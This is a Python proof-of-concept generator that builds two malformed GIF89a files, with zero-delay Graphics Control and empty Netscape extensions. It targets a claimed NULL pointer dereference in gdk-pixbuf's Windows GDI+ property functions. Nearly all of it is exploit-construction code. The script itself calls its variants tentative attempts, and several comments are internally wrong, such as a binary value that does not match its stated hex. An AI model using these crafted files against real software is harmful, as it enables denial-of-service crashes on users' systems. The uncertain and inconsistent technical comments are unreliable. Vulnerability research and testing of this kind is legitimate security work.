#!/usr/bin/env python3
"""
VULN 002 PoC Generator
NULL Pointer Dereference via Unchecked g_try_malloc in GDI+ Property Functions

Target: gdip_bitmap_get_frame_delay(), gdip_bitmap_get_n_loops(),
        gdip_bitmap_get_property_as_string() in io-gdip-utils.c
Lines:  494, 523, 411
CWE:    CWE-476 (NULL Pointer Dereference)
Attack: crafted GIF image that triggers GdipGetPropertyItemSize to return
        item_size=0, causing g_try_malloc(0) to return NULL, which is then
        passed without NULL check to GdipGetPropertyItem causing crash.

NOTE: This vulnerability only exists in Windows GDI+ backend (io-gdip-gif.c /
      io-gdip-utils.c). Linux builds do not include GDI+ backend, so this PoC
      file cannot trigger the crash on Linux.
"""

import struct
import sys

def build_gif89a_with_crafted_properties():
    """
    Construct a GIF89a file with Application Extension (Netscape loop count)
    and Graphics Control Extension (frame delay).

    The goal is to craft the GIF so that when parsed by Windows GDI+,
    GdipGetPropertyItemSize returns 0 for PropertyTagFrameDelay or
    PropertyTagLoopCount, causing g_try_malloc(0) -> NULL, and then
    GdipGetPropertyItem is called with NULL buffer -> crash.

    Attempt 1: Zero-length frame delay in Graphics Control Extension
    Attempt 2: Netscape Application Extension with loop count = 0 bytes
    """
    data = bytearray()

    # GIF89a header
    data += b'GIF89a'

    # Logical Screen Descriptor
    # Width=1, Height=1
    data += struct.pack('<H', 1)   # width
    data += struct.pack('<H', 1)   # height
    # Packed byte: Global Color Table Flag=1, Color Resolution=1, Sort=0, Size=0
    # -> 0b10000000 = 0x91 (GCT present, 4 colors)
    data += bytes([0x91])
    data += bytes([0x00])  # background color index
    data += bytes([0x00])  # pixel aspect ratio

    # Global Color Table (4 colors * 3 bytes = 12 bytes minimum for size=0 -> 2^(0+1)=2 colors)
    # size field 0 -> 2 colors -> 6 bytes
    # Let's use 0x91 packed: GCT size = 1 -> 4 colors -> 12 bytes
    data += bytes([0xFF, 0xFF, 0xFF])  # color 0: white
    data += bytes([0x00, 0x00, 0x00])  # color 1: black
    data += bytes([0xFF, 0x00, 0x00])  # color 2: red
    data += bytes([0x00, 0xFF, 0x00])  # color 3: green

    # --- Netscape Application Extension (Loop Count) ---
    # Extension Introducer
    data += bytes([0x21])
    # Application Extension Label
    data += bytes([0xFF])
    # Block Size (always 11)
    data += bytes([0x0B])
    # Application Identifier (8 bytes) + Application Auth Code (3 bytes)
    data += b'NETSCAPE'
    data += b'2.0'
    # Sub-block: loop count
    # Sub-block size = 3, Sub-block ID = 1, loop count = 0 (infinite)
    data += bytes([0x03])  # sub-block size
    data += bytes([0x01])  # sub-block ID
    data += struct.pack('<H', 0x0000)  # loop count = 0 (infinite)
    # Block Terminator
    data += bytes([0x00])

    # --- Graphics Control Extension (Frame Delay) ---
    # Using a zero delay value to potentially trigger the issue
    data += bytes([0x21])  # Extension Introducer
    data += bytes([0xF9])  # Graphic Control Label
    data += bytes([0x04])  # Block Size = 4
    # Packed: reserved=0, disposal=0, user input=0, transparent=0
    data += bytes([0x00])
    # Delay time: 0 centiseconds (zero delay - may cause item_size=0)
    data += struct.pack('<H', 0x0000)
    # Transparent Color Index
    data += bytes([0x00])
    # Block Terminator
    data += bytes([0x00])

    # --- Image Descriptor ---
    data += bytes([0x2C])  # Image Separator
    data += struct.pack('<H', 0)  # Left
    data += struct.pack('<H', 0)  # Top
    data += struct.pack('<H', 1)  # Width
    data += struct.pack('<H', 1)  # Height
    # Packed: No local color table, not interlaced
    data += bytes([0x00])

    # --- Image Data ---
    # LZW Minimum Code Size
    data += bytes([0x02])
    # Image data sub-blocks (minimal 1x1 image)
    # Sub-block: size=2, data=LZW encoded 1x1 image
    data += bytes([0x02])  # sub-block size
    data += bytes([0x4C, 0x01])  # minimal LZW data
    # Block Terminator
    data += bytes([0x00])

    # GIF Trailer
    data += bytes([0x3B])

    return bytes(data)


def build_gif89a_empty_extension():
    """
    Alternative: GIF with empty sub-block data in Application Extension
    to try to make property size = 0.
    """
    data = bytearray()

    # GIF89a header
    data += b'GIF89a'

    # Logical Screen Descriptor: 1x1
    data += struct.pack('<H', 1)
    data += struct.pack('<H', 1)
    data += bytes([0x80])  # GCT present, 2 colors
    data += bytes([0x00])
    data += bytes([0x00])

    # Global Color Table (2 colors)
    data += bytes([0xFF, 0xFF, 0xFF])
    data += bytes([0x00, 0x00, 0x00])

    # Netscape Extension with zero-length loop data (malformed)
    data += bytes([0x21])   # Extension Introducer
    data += bytes([0xFF])   # Application Extension Label
    data += bytes([0x0B])   # Block Size = 11
    data += b'NETSCAPE'
    data += b'2.0'
    # Sub-block with size=0 (empty, malformed)
    data += bytes([0x00])   # sub-block size = 0 (block terminator immediately)
    # Block Terminator
    data += bytes([0x00])

    # Graphics Control Extension with zero delay
    data += bytes([0x21, 0xF9, 0x04])
    data += bytes([0x00])           # packed
    data += struct.pack('<H', 0)    # delay = 0
    data += bytes([0x00])           # transparent index
    data += bytes([0x00])           # block terminator

    # Image Descriptor
    data += bytes([0x2C])
    data += struct.pack('<H', 0)
    data += struct.pack('<H', 0)
    data += struct.pack('<H', 1)
    data += struct.pack('<H', 1)
    data += bytes([0x00])

    # Image Data
    data += bytes([0x02])
    data += bytes([0x02])
    data += bytes([0x4C, 0x01])
    data += bytes([0x00])

    data += bytes([0x3B])

    return bytes(data)


if __name__ == '__main__':
    output_path = 'vuln_002.gif'

    gif_data = build_gif89a_with_crafted_properties()

    with open(output_path, 'wb') as f:
        f.write(gif_data)

    print(f"[+] Generated {output_path} ({len(gif_data)} bytes)")
    print(f"[+] GIF89a with zero frame delay and loop count")
    print(f"[+] Target: GdipGetPropertyItemSize returning 0 -> g_try_malloc(0) -> NULL")
    print(f"[+] Vulnerable functions:")
    print(f"    - gdip_bitmap_get_frame_delay()  @ io-gdip-utils.c:494")
    print(f"    - gdip_bitmap_get_n_loops()      @ io-gdip-utils.c:523")
    print(f"    - gdip_bitmap_get_property_as_string() @ io-gdip-utils.c:411")
    print(f"")
    print(f"[!] NOTE: GDI+ backend is Windows-only. This file cannot trigger")
    print(f"    the crash on Linux builds of gdk-pixbuf.")

    # Also write alternative variant
    alt_path = 'vuln_002_alt.gif'
    alt_data = build_gif89a_empty_extension()
    with open(alt_path, 'wb') as f:
        f.write(alt_data)
    print(f"[+] Generated {alt_path} ({len(alt_data)} bytes) - malformed Netscape extension variant")
